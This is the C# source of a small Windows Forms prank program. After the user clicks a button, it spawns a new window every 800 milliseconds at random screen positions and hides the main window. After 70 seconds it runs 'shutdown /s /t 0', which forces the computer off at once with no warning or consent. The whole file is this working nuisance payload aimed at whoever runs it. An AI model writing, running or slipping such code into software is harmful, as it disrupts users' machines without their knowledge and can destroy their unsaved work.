using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        private Timer timer; 
        private Timer closeTimer; 
        private int formCount; 

        public Form1()
        {
            InitializeComponent();
            timer = new Timer(); 
            timer.Interval = 800; 
            timer.Tick += Timer_Tick; 

            closeTimer = new Timer(); 
            closeTimer.Interval = 70000; 
            closeTimer.Tick += CloseTimer_Tick; 
        }

        private void btnCleck_Click(object sender, EventArgs e)
        {
            formCount = 0; 
            timer.Start(); 
            closeTimer.Start(); 
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            Form2 form2 = new Form2(); 
            form2.StartPosition = FormStartPosition.Manual;
            Random random = new Random();
            int x = random.Next(0, Screen.PrimaryScreen.WorkingArea.Width - form2.Width);
            int y = random.Next(0, Screen.PrimaryScreen.WorkingArea.Height - form2.Height);
            form2.Location = new Point(x, y); 
            form2.Show(); 
            this.Hide();
        }

        private void CloseTimer_Tick(object sender, EventArgs e)
        {
            timer.Stop(); 
            closeTimer.Stop(); 
            this.Close(); 
            Process.Start("shutdown", "/s /t 0");
        }
    }
}